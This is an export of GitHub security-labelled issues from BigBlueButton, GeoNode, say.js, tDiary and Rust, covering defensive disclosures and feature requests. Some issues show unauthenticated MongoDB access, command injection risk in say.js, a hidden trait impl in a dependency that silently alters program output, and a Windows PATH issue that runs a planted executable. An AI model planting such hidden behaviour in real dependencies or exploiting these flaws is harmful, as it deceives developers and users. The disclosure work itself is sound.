",no,"priority: normal,type: enhancement,target: security,module: api,"
bigbluebutton/bigbluebutton,828243766,"No mongo security","The mongo database on the server accepts connections from localhost with no authentication required.

`mongo mongodb://127.0.1.1/` is sufficient to get access to the mongo database.

Probably some kind of security key should be required.
",,no,"deploy: configuration,target: security,type: bug,"
bigbluebutton/bigbluebutton,100495079,"Prevent re-use of join URL","Originally reported on Google Code with ID 1937

```
When joining meeting from wordpress plugin password  is travelling in GET request.

how to set it to in POST method. as bigbluebutton server accepting request via GET.
plz suggest where to locate file to fix this issue or any idea.   
```

Reported by `rupes4ur` on 2015-05-01 08:26:25
","```
This is not an issue but how BigBlueButton is designed.

The password (albeit named attendeePW and moderatorPW) are really tokens.  Most 3rd
party integrations create a random string for the moderator and viewer tokens when
creating the meeting and, depending on the user, return one of these tokens in the
join URL.

The real security is in the shared secret and checksum.  See

  http://docs.bigbluebutton.org/dev/api.html#usage

For more information on security in BigBlueButton, see

  http://docs.bigbluebutton.org/support/faq.html#does-bigbluebutton-offer-secure-collaboration




```

Reported by `ffdixon` on 2015-05-01 15:16:55
- **Status changed**: `WontFix`
```
if someone catch or distribute this url and enter it in browser while meeting is running
it successfully get entered. as i mentioned in above screenshot. this url is passing
through GET.  

is there any way to block this direct link access. ?? my website auditing dept. told
me to fix this issue to clear audit.

10.25.122.38/bigbluebutton/api/join?meetingID=9b62c525379ddd6d8482a2a0d89d345f41d7232b&fullName=mad&password=753e91286bebce0ddd63dc0bb65bb7b5&checksum=0af6187c8b6d8c2b61a9f2cd49ca8bb57f01fb12





```

Reported by `rupes4ur` on 2015-05-14 08:55:30
```
While the parameter may say password, think of it more as a meeting token.  The URL
has a checksum that is signed by a shared secret.  Any changes to the URL would invalidate
the checksum.

For more information on security in BigBlueButton, see

  http://docs.bigbluebutton.org/support/faq.html#does-bigbluebutton-offer-secure-collaboration


```

Reported by `ffdixon` on 2015-05-14 09:14:01
```
i agree Any changes to the URL would invalidate the checksum. but if user paste the
same link it gets entered. how to block it ??
```

Reported by `rupes4ur` on 2015-05-14 09:33:49
```
It should be possible to match the user with a session token, or to allow the use of
a join URL only once by the server.

We'll look at doing this as part of a future release.  To understand how we prioritize
features, see

  http://docs.bigbluebutton.org/support/faq.html#when-will-feature-x-be-implemented
```

Reported by `ffdixon` on 2015-05-16 07:36:23
- **Status changed**: `Accepted`
- **Labels added**: Type-Enhancement, Priority-Low, Security
- **Labels removed**: Type-Defect, Priority-Medium
```
Dear Team,

The newly reported vulnerability (Authentication Bypass) found in BigBlue Button is
actually founded and reported by the undersigned, although it was communicated by Mr
Rupesh in absence of mine. PoC will be shared to you, if is it required for your future
reference. PoC will contain the complete testing methodology of the reported finding.

As you have already accepted that the reported finding is present in your module and
you will patch it and release the upgraded module with new version. So, I request you
to give some credits for motivating my skills, it will be much beneficial for my career
prospective. 

I can also provide you the best solution for the reported finding.

Your response is highly appreciated.

With Best Regards,
Vibhor Gupta
InfoSec Consultant & Security Researcher
```

Reported by `guptavibhor66` on 2015-05-20 11:43:11
",no,"status: accepted,type: enhancement,priority: low,target: security,module: api,"
bigbluebutton/bigbluebutton,727344627,"option to disable libreoffice integration","Since converting office documents on the server will probably always be somewhat of a security risk (even if moved into a container) and in lieu of #10619 it would be nice to have a flag for the installer to just leave that feature out.

Untill (and if) we get that:
Which of the mime types in settings.yml needs libreoffice for conversion?
That does not seem to be documented anywhere, so if we had a list we could disable those for improved security.","What if you just disable presentations altogether?That's not an option.
I know that PDF don't require libreOffice, question is what else :-)I see, so you want to upload PDFs only (and the handful of other things that may or may not require libre office)?According to this, seems images + PDFs: https://docs.bigbluebutton.org/2.2/architecture.html#presentation-conversion-flowJup, that would make the configuration
`    uploadValidMimeTypes:
    - extension: .pdf
      mime: application/pdf
    - extension: .jpg
      mime: image/jpeg
    - extension: .jpeg
      mime: image/jpeg
    - extension: .png
      mime: image/png`
for anyone else looking for that ;-)
Haven't found an elegant way to stop the (now useless) background libreoffice workers without breaking things, but then again that's not really important.We're moving the libreoffice conversion to a container that will be created/destroyed for each conversion ( instead of having daemons running ), so it will provide the desired effect: if no odt is uploaded, no libreoffice will run in server.

Assigning it to @gustavotrott as he's working in this specific topic.
@fireba11 which config file can be used to set these options?sounds it is this file
/usr/share/meteor/bundle/programs/server/assets/app/config/settings.ymlaye. you should override via /etc/bigbluebutton/bbb-html5.yml as per https://docs.bigbluebutton.org/admin/configuration-files.html#local-overrides-for-configuration-settings",no,"type: enhancement,module: web,target: security,component: presentation,"
bigbluebutton/bigbluebutton,124353092,"Restrict access to recording URLs returned from getRecordings","Currently, the [getRecordings](http://docs.bigbluebutton.org/dev/api.html#getrecordings) API call returns a list of static URLs for a given meetingID.

When viewed from within a LMS integration for BigBlueButton (such as Moodle, Canvas, Sakai, etc.), a user can share the recording URLs with others.  

This makes it convenient for the instructor to copy a recording URL from one lecture and make the recording available to students in a different course by adding the URL as an external link.

An educational institution may want to restrict access to recording URLs to authenticate students within the LMS.  Note, this wouldn't prevent a user from copying a recording as they could always record their screen while viewing the BigBlueButton recording, then upload this recording to YouTube, for example.

Some possible approaches to restricting access to recording URLs
1.  Extend getRecordings to return URLS that are viewable only once

The LMS could make a getRecordings(meetingID,'once') and the list of recordingURLs all have a nonce value that the BigBlueButton server will only accept once.
1.  Extend getRecordings to return URLS that are viewable only X hours

The LMS could make a getRecordings(meetingID,3) and the list of recordingURLs all have a nonce value that the BigBlueButton server will only accept the URL for up to 3 hours.

This URL could be shared with others during the 3 hours.
1.  Extend getRecordings to return 'access' URLs to the BigBlueButton server, one for each recording.  The access URLs that can be used only once. 

When the user clicks an access URL, the BigBlueButton server returns a sessionID (as a cookie) to the user along with dynamically generated URL that can be used for X hours.

When viewing the recording, the user can refresh their web page with the dynamically generated URL, which will send the sessionID back to the recording server.  The recording server will validate the sessionID is still active (has not expired), and if expired, redirect the user to a page that states this recording URL has expired.
","I have setup my own BBB server on premises yester day, How you restrict  my campus  students and faculty users? how to setup sso authentication? 
Is it required to setup separate server for asterisk server ?
I am new on this application,
Kindly suggest.",no,"type: enhancement,target: security,module: api,module: recording,"
xmppjs/xmpp.js,22563910,"Support for security manifesto from Peter","I propose we help Peter to get his security manifesto implemented: https://github.com/stpeter/manifesto
","Agreed
+1
",no,"security,"
tdiary/tdiary-core,392446185,"ruby 2.6からString#cryptが非推奨","タイトルのとおりなんですが、tDiaryでは`String#crypt`をBasic認証の認証部分(`lib/tdiary/rack/auth/basic.rb`)でWEBrickのドキュメントにある例のとおりに使っています。Basic認証そのものがinsecureだから非推奨というスタンスだと思うので、そもそもデフォルトの認証方法から考え直す必要があるかも知れない。

すぐに使えなくなるわけではないけど、いちおう俎上に上げておきます。","これ、
・認証方式がBasic認証で良いか
・パスワードの格納方式がcryptで良いか
の２つの問題に分けられますね。

前者は、TLSの使用を前提として、まだアリだとは思っています。
https://developer.mozilla.org/ja/docs/Web/HTTP/Authentication同意します。ただ後者を改善するとなると、.htpasswdの生成/利用も含めて再考が必要なので、認証方式そのものをいっしょに再検討するのはありかなと。後者についてcryptの代わりにshaを使うのが良いと思います。htpasswdコマンドもSHA1使えます。
https://httpd.apache.org/docs/trunk/misc/password_encryptions.html

前者については、OmniAuthでの外部サービス連携を使うのでダメですかねぇ。
https://github.com/tdiary/tdiary-core/blob/master/doc/HOWTO-authenticate-in-rack.mdApacheのhtpasswdにおいては、SHA1はinsecure扱いですね。いまはMD5が標準。

で、問題は`WEBrick::HTTPAuth::Htpasswd`がMD5もSHA1も未サポートってところで。仮にhtpasswdコマンドをつかってSHA1 or MD5な`.htpasswd`ファイルを生成しても、tdiary/rack/auth/basicでWebrickを使った認証処理を使えなくなってしまうという。",no,"security,"
GeoNode/geonode,639425112,"seo & security improvements","This issue collects Ideas for improvements regarding SEO and security. 

# SEO
## robots.txt
Add a robots.txt which defines how crawlers index a geonode instance. A possible solution is to simply add a new URL together with an example robots.txt like:
```
urlpatterns = [
    # ...
    path(
        ""robots.txt"",
        TemplateView.as_view(template_name=""robots.txt"", content_type=""text/plain""),
    ),
]
```

## sitemap

Add a sitemap to geonode which helps search engines to correctly index your pages and higher the seo ranking. For this job we can use the sitemap framework which comes with Django: https://docs.djangoproject.com/en/3.0/ref/contrib/sitemaps/

More about why sitemaps are still important for example here: https://www.searchenginejournal.com/html-sitemap-importance/325405/

# Security

## Password strength
GeoNode currently expects a password to have a length of 6 characters as the only requirement. 
(This allows insufficient  combination like _geonode/geonode_ or _username/password_ )

We could improve security by using Djangos inbuilt password Validators

- **UserAttributeSimilarityValidator**, which checks the similarity between the password and a set of attributes of the user.
- **MinimumLengthValidator**, which checks whether the password meets a minimum length. This validator is configured with a custom option: it now requires the minimum length to be nine characters, instead of the default eight.
- **CommonPasswordValidator**, which checks whether the password occurs in a list of common passwords. By default, it compares to an included list of 20,000 common passwords.
- **NumericPasswordValidator**, which checks whether the password isn’t entirely numeric.

https://docs.djangoproject.com/en/3.0/topics/auth/passwords/#enabling-password-validation

Personally I would welcome `UserAttributeSimilarityValidator` and `NumericPasswordValidator` to be added. Plus a third custom validator which forces the user to choose a combination between characters, numbers and special chars.

## Block user failed login attempts
A further improvement in security is to block users after x failed login attempts for y minutes/hours. This lowers the risks of password list penetrations and avoids unneeded server load. Possible candidates:

- https://github.com/jazzband/django-defender
- https://github.com/jazzband/django-axes 
","++ very good, thanks @t-book I would postpone this to 3.2? Or shall someone make a draft for 3.1?@gannebamm yes +1 . I do see this ticket as Ideas for improvements nothing urgent.@t-book do you aready have a PR for this?@giohappy unfortunately not. this is only in the state of suggestion. (we can close if you want)We can keep it around for a while. We were considering some SEO optimizations for master branchs.",no,"feature,security,"
GeoNode/geonode,918471743,"GeoFence rules not removed when a Remote Service is deleted","## Expected Behavior

Rules related to layers belonging to the deleted remote service should be removed.

## Actual Behavior

Rule are not removed.

## Steps to Reproduce the Problem

  1. Create a layer from a remote service
  2. Delete the remote service
  3. Enter in the ""GeoFence Data Rules"" page in GeoServer and check for rules related to the deleted layer

## Specifications

  - GeoNode version: 3.2.x (as of 2021-06-10)
  - GeoServer version: 2.18.x (as of 2021-06-10)
  - Installation method (GeoNode Docker):
","@giohappy let's discuss this as part of the larger review of interactions with geofence for 3.3
",no,"major,security,"
GeoNode/geonode,1111385699,"image mosaic plugin layer if deleted, deletes whole database","## Expected Behavior
If a new image mosaic layer is created with indexer.properties pointing to the same database as of geonode's default database. when it is deleted it should only delete the granule indexes instead of complete database.


## Actual Behavior
When the layer is deleted from geonode, whole database gets deleted.

## Steps to Reproduce the Problem

  1. Follow [Using the ImageMosaic plugin for raster time-series data](https://docs.geoserver.org/latest/en/user/tutorials/imagemosaic_timeseries/imagemosaic_timeseries.html)
  **datastore.properties**
  ```
SPI=org.geotools.data.postgis.PostgisNGDataStoreFactory
host=localhost
port=5432
database=geonode_data
schema=public
user=geonode
passwd=geonode
Loose\ bbox=true
Estimated\ extends=false
validate\ connections=true
Connection\ timeout=10
preparedStatements=true
  ```
  2. updatelayers
  3. delete the layer from geonode frontend

## Specifications

  - GeoNode version: 3.2
  - Installation method : Manual
  - Platform: 20.04","@majid-saeed thanks for reporting this. We're going to test and investigate it.It actually deletes every database attached to it. It should be explored and until then should be used with caution to not point to the default database and always make a new database for each image mosaic layer.@majid-saeed @giohappy so far this looks to be an error with the `ImageMosaic` plugin on GeoServer.

We are trying to understand the best way to get this one fixed.",no,"blocker,security,investigation,3.2.x,3.3.x,master,"
Marak/say.js,499987700,"WIP: Escaping characters sent to TTS","- Fixes #90
- Fixes #93
- SEMVER: This is a MAJOR change, but since pre 1.0, can be a MINOR

This change highlights the need for a real test suite :(","You shouldn't replace [ and ] since they are used on macOS, for example, `Hello world! [[rate 400]] This text is spoken rapidly. [[volm 0.4]] This text is spoken very quiet[[rset]]`.
See: [Apple SpeechSynthesisProgrammingGuide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/SpeechSynthesisProgrammingGuide/FineTuning/FineTuning.html) Table 3-1",yes,"Security,"
Marak/say.js,455349727,"Project probably has security vulnerabilities","This project most likely has security vulnerabilities. If an attacker is able to craft any string being spoken then it's likely such a string can be used for command injection.

Such security implications are probably going to change between MacOS/Linux vs Windows/Powershell.

The `text` and `voice` arguments need to be cleaned up before being passed to the commands. `voice` should have a strict subset of characters, and `text` should probably replace all special characters such as `/` with `FORWARD SLASH`.",,no,"Security,"
Marak/say.js,494407468,"It needs to escape text.","Hi,
For the darwin platform, It needs to escape the text.

Usage: say [-v voice] [-o out] [-f in | message]
```
let text=""-findex.js"";
//say.speak(text);
say.speak('""'+text.replace(/""/g,'\\\""')+'""');
```","Related to #90",no,"Security,"
oneclickorgs/one-click-orgs,25807670,"Drop support for Ruby 1.9.3 before February 2015","Ruby 1.9.3 will be end-of-lifed on 23 February 2015, and security fixes will stop then.
",,no,"task,security,"
oneclickorgs/one-click-orgs,8262653,"Improve password storage, and don't roll our own authentication","We currently use a password storage mechanism based off a Merb authentication helper. This was chosen to ease the migration from Merb, but it is now out-of-date when it comes to good security practice.

Instead we should be using something like bcrypt to store password hashes, ideally via a common Rails library (e.g. Devise, Sorcery, Rails's built-in has_secure_password API).
","Here is a technique for migrating to a new password store: http://blog.jgc.org/2012/06/one-way-to-fix-your-rubbish-password.html?m=1
",no,"task,security,"
rust-lang/rust,382022071,"Enable strict HANDLE checking for all Windows Rust programs","To help protect against bugs in unsafe or third-party code, the Rust compiler should emit code to enable strict `HANDLE` checking for all Windows Rust programs. The process will receive a fatal error if it manipulates a `HANDLE` that is not valid, such as using an uninitialized `HANDLE` or calling `CloseHandle` twice.

See MSDN for `SetProcessMitigationPolicy` and `PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY`:

https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy

Strict `HANDLE` checking might cause compatibility problems for Rust programs that depends on third-party libraries that misuse `HANDLE`s. As a general rule, strict `HANDLE` checking cannot be turned off once it is turned on, so there would be no backdoor to allow sloppy third-party code to run without raising a `HANDLE` exception. If that compatibility constraint is too severe, strict `HANDLE` checking could be limited to debug builds or disabled with an opt-out compiler flag.

Here is how Firefox enables strict `HANDLE` checking for its sandbox processes:

https://searchfox.org/mozilla-central/rev/5117a4c4e29fcf80a627fecf899a62f117368abf/security/sandbox/chromium/sandbox/win/src/process_mitigations.cc#120-131",,no,"A-runtime,O-windows,C-enhancement,A-security,T-libs-api,"
rust-lang/rust,598929601,"Exploit mitigations applied by default are not documented","There seems to be no documentation on exploit mitigations in Rust, specifically:

1. What exploit mitigations are supported?
1. What mitigations are enabled by default?
    1. Is that answer different if building with `cargo` instead of `rustc` directly?
    1. Does that vary by platform?
1. How to enable/disable specific mitigations?

This is relevant not only for security assessment, but also for performance comparison against other languages - both languages need to have the same exploit mitigations enabled for an apples-to-apples comparison.",,no,"C-enhancement,A-security,T-compiler,"
rust-lang/rust,1052986435,"Method resolution can be influenced in unexpected ways by external crates.","<!--
Thank you for filing a bug report! 🐛 Please provide a short summary of the bug,
along with any information you feel relevant to replicating the bug.
-->

**I tried this code:**

```rust
use std::cell::RefCell;

fn foo(x: &RefCell<Box<[u8]>>) {
    let y = x.borrow();
    let z = y.as_ref();

    println!(""{:?}"", z);
}

fn main() {
    foo(&RefCell::new(Box::new([1, 2, 3_u8])));
}
```

**I expected to see this happen:** Either the code should fail to compile or it should [print `[1, 2, 3]` (the latter is what currently happens when the above is executed in the playground)](https://play.rust-lang.org/?version=stable&mode=debug&edition=2021&gist=88cb7d40bf6a1bd469061aead4fdd9b9).

Instead, this happened: The code prints `[21, 42, 63]`

## Context
What I didn’t tell you, my crate also contains this code
```rust
fn _unrelated_function() {
    some_dependency::useful_api()
}
```

other than that, there are no other traits in scope, etc; no potential for any surprises, really there’s nothing else; you’ve seen the [whole source code](https://github.com/steffahn/iffy_methods/blob/master/main_crate/src/main.rs) of a crate that prints `[21, 42, 63]`.

## More context

Now, the dependency in question offers only a single public thing, a function
```rust
pub fn useful_api() {}
``` 

Of course it also has some
```rust
// private module!
mod dont_look_at_this {
    [DETAILS OMITTED]
}
```
but that clearly isn’t used in the `useful_api` implementation, so it’s probably some tests or whatever, entirely unrelated, and I don’t have to worry about, correct? Well apparently not correct.

<details><summary>Here’s the whole source code of <code>some_dependency</code> <i>(click to expand)</i>.</summary>

```rust
pub fn useful_api() {}

// private module!
mod dont_look_at_this {
    mod really_nobody_should_care_about_this {
        pub struct Pwned;
        use std::{cell, fmt};
        impl fmt::Debug for Pwned {
            fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
                formatter.write_str(""[21, 42, 63]"")
            }
        }
        impl AsRef<Pwned> for cell::Ref<'_, Box<[u8]>> {
            fn as_ref(&self) -> &Pwned {
                &Pwned
            }
        }
    }
}
```

</details>

Full reproduction guide:
```sh
git clone https://github.com/steffahn/iffy_methods.git
cd iffy_methods
cargo run
```

<hr>

Is this a known issue? Is this something that needs to be fixed? @rustbot label T-lang, T-compiler, A-traits, A-security","It just occurred to me how it’s even possible to make
```rs
use std::cell::RefCell;

fn foo(x: &RefCell<Box<[u8]>>) {
    let y = x.borrow();
    let z: &[u8] = y.as_ref();

    println!(""{:?}"", z);
}

fn main() {
    foo(&RefCell::new(Box::new([1, 2, 3_u8])));
}
```
misbehave. (Note the explicit type signature `z: &[u8]`!)

See [this branch](https://github.com/steffahn/iffy_methods/tree/alternative_version_with_explitic_type) for how it’s done.> Is this a known issue? Is this something that needs to be fixed? 

This doesn't look like method lookup to me (**EDIT**: okay, I guess autoderef would let `.as_ref()` do something else if it didn't hit the spooky `impl`, and autoderef is parth of method lookup).

It's long been known that the ""only one remaining applicable `impl`"" design of trait `impl` lookup could lead to subtle issues. Most of the focus over the years has been around the ability to introduce ambiguities and therefore inference failures, with a new `impl` of an existing trait.

What's worse here IMO is the design of the `AsRef` trait, which I've only had a vague displeasement with over the years, but this doesn't make me like it any better.

When you do `x.as_ref(): &[T]`, you're *not* calling `AsRef::<&[T]>::as_ref(&x)`, but rather `AsRef::as_ref(&x): &[T]`, i.e. you're asking to *coerce* the result of `x.as_ref()`, *not* hint its type. It's only if inference has absolutely no idea what the type is, that you are eventually hinting the type, *through* the noop coercion.

A ""correct"" design would require writing something like `x.as_ref::<&[T]>()` to call it (since we can't have something as nice as `x.as_ref(&[T])`), and the method you need to implement wouldn't be called `as_ref` (or at least wouldn't take method-call `self`).

(**EDIT**: something I forgot to include here is that `T: AsRef<U>` doesn't have a blanket impl for `T == U` the same way `From`/`Into` do, which both decreases ergonomics for certain usecases, but also allows inference to succeed when only the source type is known, but the target type isn't - sadly we can't fix this now)

I know this kind of thing is not that helpful but if I were to make a suggestion (for e.g. lints) is that `AsRef` should *only* used in generic functions, i.e. `x.as_ref()` should only be called when `x`'s type is a type parameter with a *single* `AsRef` bound.

(Something similar applies to `.into()`, I suppose - I tend to prefer e.g. `u32::from(x)` instead of `x.into()`)

Oh and currently, `_: Trait<Bar>` doesn't solve even with a single `impl`, but `Foo<_>: Trait<Bar>` does, which is IMO part of why this kind of behavior is not as obvious to users as it could be - I suspect Chalk may make the problem worse, without intentionally special-casing ""`Self` param is an inference variable"" on top of it.I guess the main thing that bugs me here is that when calling a standard library trait method (`as_ref` from the `AsRef` trait; no other `as_ref` methods of other traits in scope) on a standard library type (`&RefCell<Box<[u8]>>`) type inference can decide to fill in the details to call into a third-party implementation, as long as it’s somewhere in one of your (transitive) dependencies.

I would probably prefer if it’d be made *necessary* to somehow mention the `Pwned` type explicitly. For a minimal improvement perhaps a *warning* that triggers whenever type inference fills in the type parameter of a trait impl that allowed that impl to exist in the first place w.r.t. orphan rules. I.e. the `AsRef<Pwned> for cell::Ref<'_, Box<[u8]>>` is only allowed because `Pwned` is local to `some_dependency`; but IMO the caller of this method also should only be getting this implementation by somehow explicitly requiring that a `Pwned` value is *really* what they want. (Passing the result to a function expecting `&Pwned`, or assigning to a `&Pwned` variable should be enough though...)

The other thing that bothers me is that method inference auto-derefs `Ref<'_, T>` to `T` when looking up `as_ref` in the first place: Even when `Ref<'_, T>` doesn’t implement `AsRef<Foo>` for any type `Foo`, downstream crates *can* add such an impl, so why is the compiler allowed to determine that there is no `as_ref` method?

Both things listed above can have the unfortunate outcome that code *changes behavior* depending on what dependencies a crate has. If it merely would be possible that code *stops compiling successfully* due to an additional dependency with additional `impl`s, that would be fine IMO, it’s the behavior change that bothers me.

<hr>

@eddyb Note that this issue is not really about `as_ref` in particular but instead about the interaction of orphan rules + type inference. I only picked `as_ref` because it’s a possible example of the pattern using standard library types and traits.

I’m aware of possible inference *failures* that can be introduced by new trait implementations, this issue is mainly about behavior *change* i.e. successfully compiling code turns into successfully compiling code with different behavior.

<hr>

I do agree with the assertion that `as_ref` (and similarly `into`, etc) would be better with a type parameter on the method, so much so that in-fact I’ve even created a [proof-of-concept crate that adds a version of `.into` that can accept a type argument](https://docs.rs/into_ext/0.1.2/into_ext/trait.IntoExt.html). (It even has an [unpolished/unpublished version of the trait for `AsRef`](https://github.com/steffahn/into_ext/blob/7d85e95b91ffded1d3f9a18ca8a6512ec3cceecc/src/lib.rs#L215-L239).)I guess I largely agree with you on most of those points.

I do not have a lot of confidence in us being able to restrict behavior here, but it would be interesting to do a crater run where we compare the crates mentioned in `TypeckResults` (via e.g. `TyKind::Adt`) vs the crates mentioned in the types of explicit paths in the body (but the naive approach might not complain if `foo` happened to call `some_dependency::useful_api()` - so a non-trivial notion of ""type reachability"" might be needed ugh).

It's definitely weird to have a crate ""show up out of nowhere"", but I don't have any good ideas for a predicate *during* trait solving (or even coherence), because of the ""global"" nature of trait solving - the best I can come up with is detecting the surprising situation after the fact and emitting a lint warning.Here's another case I believe related to this issue, or at least another case derived from the ""only one remaining applicable impl"" desig: https://play.rust-lang.org/?version=stable&mode=debug&edition=2021&gist=7c1a2e56a4ccb316bd7480494c44225c",no,"A-traits,A-security,T-lang,T-compiler,C-bug,"
rust-lang/rust,40515546,"MinGW's linker does not create a reloc section for DYNAMICBASE executables","This issue exists to track the necessity of a workaround for this bug in the compiler.
","Triage: unsure if there's been any change.
@rustbot modify labels: -O-windows +O-windows-gnu

Fixed in Binutils 2.34: https://sourceware.org/bugzilla/show_bug.cgi?id=17321
There is reliable workaround for older versions: https://github.com/TheRyuu/FFmpeg/commit/91b668acd6decec0a6f8d20bf56e2644f96adcb9
LLD was never affected.",no,"A-linkage,A-security,O-windows-gnu,C-bug,"
rust-lang/rust,967513119,"Insecure behavior in std::process::Command on Windows","There appears to be a security vulnerability in std::process::Command, specifically on Windows.  The documentation for the `new` function states this:

> If program is not an absolute path, the PATH will be searched in an OS-defined way.
>
> The search path to be used may be controlled by setting the PATH environment variable on the Command, but this has some implementation limitations on Windows (see issue #37519).

What this does not say is that these implementation limitations cause the program to be executed from the current directory, even if that is not in `PATH`.  This is a vulnerability and this behavior has been known to be insecure on Unix for many years.

As a result, it is not possible to use Rust to invoke other than an absolute path when the current directory is untrusted, such as when a user is working in cloned Git repository.  Moreover, this fact is not even documented, and as such, I would reasonably expect that directories outside of `PATH` are not searched.

I've attached [a tarball of a cargo project](https://github.com/rust-lang/rust/files/6971445/path-check.tar.gz) which contains two trivial programs.  To reproduce the problem, do the following:

1. Open PowerShell.
2. Extract the tarball.
3. Change into `path-check`.
4. Run `cargo build`.
5. Change into `target\debug`.
6. Run `$env:Path = ""C:\Users\User\.cargo\bin""` to set a fixed `PATH` without the current directory.
6. Run `& '.\path-check.exe'`.
7. Notice that `exploit.exe` is also invoked and that its output is displayed.

I used a [Windows 10 Development VM](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/) for this purpose.  I don't habitually use Windows; I'm mostly a Linux user, so my apologies if the steps are hard to understand.

I realize that the current functionality exists because Rust looks only for `.exe` files and not other types of files, and it therefore it otherwise passes files which do not exist in `PATH` to `CreateProcessW`, which has the insecure behavior.  However, just because Microsoft has designed an insecure interface does not mean Rust should permit the same behavior.

[The approach that Go uses for searching for executables](https://github.com/golang/go/blob/master/src/os/exec/lp_windows.go), _other than the use of the current directory_, is generally good.  It uses `PATHEXT` (or, if absent, a hardcoded list) to look for extensions, and then considers each component in `PATH` (rejecting empty components), looking for each extension in turn.  This algorithm (with the current directory) is used by CMD, and therefore doing the same thing without the current directory would be normal and expected for Windows users, and also secure.

Note that unlike on Unix, on Windows empty components in `PATH` should not be treated as the current directory.  Unfortunately, many Windows machines contain a trailing semicolon in `PATH` and as such, that would preserve insecure semantics.

I originally reported this to the private security list, but it was [determined that this behavior had been discussed publicly before](https://internals.rust-lang.org/t/std-command-resolve-to-avoid-security-issues-on-windows/14800), and thus, opening an issue was appropriate.  It remains a vulnerability, and a CVE should still be issued, though.

This came to my attention because Go has the same insecure behavior and they have deliberately chosen to retain the vulnerability for compatibility, so every Go program that runs on Windows (including Git LFS, which I maintain) must contain special code to work around this.  Since Rust has already documented secure behavior (using `PATH`), all that needs to be done is actually fixing the implementation, which is less of a problem.

### Meta

`rustc --version`:
```
rustc 1.54.0 (a178d0322 2021-07-26)
```

I've verified that the vulnerable code exists in a recent HEAD.","You should check out this PR https://github.com/rust-lang/rust/pull/87704Yes, that would solve the security problem.  It would also end up breaking invoking any batch files or other programs that people are running right now without using a suffix, which would be less desirable.  I""ll make a comment on the PR.cc @rust-lang/libs Seems like @ChrisDenton's PR already solves this and doesn't introduce the breakage that @bk2204 was worried about. I'm assuming we can close this when #87704 merges.There's potential breakage if anyone depended on any of those implicit paths that #87704 will no longer search. That may still be the way to go -- I'm just saying that it's not entirely worry-free.Indeed. I am happy to change my PR so it's a closer match to the existing behaviour (current directory aside).  This would fix the immediate issue while having the lowest chance of breaking things. This would also allow for a separate decision on removing implicit paths at a later date. Hm, actually that does sound like a good idea.",no,"O-windows,A-security,P-high,T-libs-api,C-bug,"
rust-lang/rust,1058975673,"`-Ccontrol-flow-guard` should raise an error on unsupported platforms","Right now specifying `-Ccontrol-flow-guard` and targetting a non-msvc platform will silently ignore the `-Ccontrol-flow-guard` option. Given the purpose of the flag and the audience Rust targets, I think this is an ill-considered behaviour. Especially of concern I think is when a non-MSVC windows target is used. An engineer might think the mitigations are enabled and the code would work fine in their testing, possibly only because the mitigations were never really turned on!

I believe that mitigation-related flags are sensitive enough to warrant an error when `rustc` isn't able to implement those mitigations for the artifact.","cc https://github.com/rust-lang/rust/issues/68793",no,"A-security,T-compiler,C-bug,"
rust-lang/rust,382023878,"Restrict Windows DLL search path as a precaution against DLL pre-loading attacks","Windows' standard DLL search path contains directories that can be vulnerable to DLL pre-loading attacks. An application can use the `SetDefaultDllDirectories` API to specify a default DLL search path for the process that eliminates the most vulnerable directories and limits the other directories that are searched.

For example, as a precaution, Firefox removes the current directory from the DLL search path and then restricts the DLL search path to the application's installation directory, the Windows system directory, and any paths explicitly added using the `AddDllDirectory` or `SetDllDirectory` APIs.

https://searchfox.org/mozilla-central/rev/5117a4c4e29fcf80a627fecf899a62f117368abf/toolkit/mozapps/update/updater/loaddlls.cpp#15-30

https://searchfox.org/mozilla-central/rev/5117a4c4e29fcf80a627fecf899a62f117368abf/security/sandbox/chromium/sandbox/win/src/process_mitigations.cc#46-58

To help protect against DLL pre-loading attacks, the Rust compiler could emit similar code to restrict its DLL search path for all Windows Rust programs. Changing the DLL search path could cause compatibility problems for Windows Rust programs that assume they can implicitly load DLLs in the current directory without explicitly configuring their DLL search path. The workaround is for those programs to configure their DLL search path using the the `AddDllDirectory` or `SetDllDirectory` APIs.

See MSDN for `SetDefaultDllDirectories`:

https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-setdefaultdlldirectories
","would this cause issues with e.g. steam overlay?I feel that this specific change is out-of-scope for the Rust’s standard library. The standard library consciously avoids dealing with dynamic library loading. Therefore, the only DLLs that will be loaded without bringing in a crate (or calling winapi APIs directly) will be those that were dynamically linked to as part of building. Those libraries will not be affected by `SetDefaultDllDirectories` in any way. 

To me it seems that the more appropriate location to do this would be in libraries that wrap/implement dynamic library loading or, in case winapi APIs are being called directly, by the caller.@nagisa I disagree. [ `SetDefaultDllDirectories`] is a Windows API, and so will always be present.  Furthermore, it modifies global state, so I suspect that it is best to call it as early as possible.  Rust can inject a call to it before `main` ever runs.

[ `SetDefaultDllDirectories`]: <https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-setdefaultdlldirectories>All normal DLL dependencies are loaded and their symbols resolved before `main` is ever called. All C++ static initializers are also run before `main` is ever called, so Rust never has a chance to call `SetDefaultDllDirectories` before that stuff happens. Rust *does* actually `LoadLibrary` a few DLLsitself though but they're all known system DLLs that wouldn't be affected by `SetDefaultDllDirectories` anyway.

Having Rust implicitly call `SetDefaultDllDirectories` would bring in the possibility of breaking existing programs that rely on the default DLL search order, and from experience I can say that trying to figure out why a DLL can no longer be found is an incredibly frustrating ordeal.

>I disagree. SetDefaultDllDirectories is a Windows API, and so will always be present. 

```C
      // SetDefaultDllDirectories is always available on Windows 8 and above. It
      // is also available on Windows Vista, Windows Server 2008, and
      // Windows 7 when MS KB2533623 has been applied.
```

This doesn't quite sound like **always** present.Could Rust run `SetDefaultDllDirectories` from a static initializer?The order of C++ static initializers is not well defined, so there's no guarantee that an initializer in one compilation unit will run before an initializer in a different compilation unit.SetDefaultDllDirectories is **not** a security feature. 
https://web.archive.org/web/20190113103607/https://blogs.msdn.microsoft.com/oldnewthing/20170126-00/?p=95265#comments> All normal DLL dependencies are loaded and their symbols resolved before `main` is ever called. All C++ static initializers are also run before `main` is ever called, so Rust never has a chance to call `SetDefaultDllDirectories` before that stuff happens. Rust _does_ actually `LoadLibrary` a few DLLsitself though but they're all known system DLLs that wouldn't be affected by `SetDefaultDllDirectories` anyway.

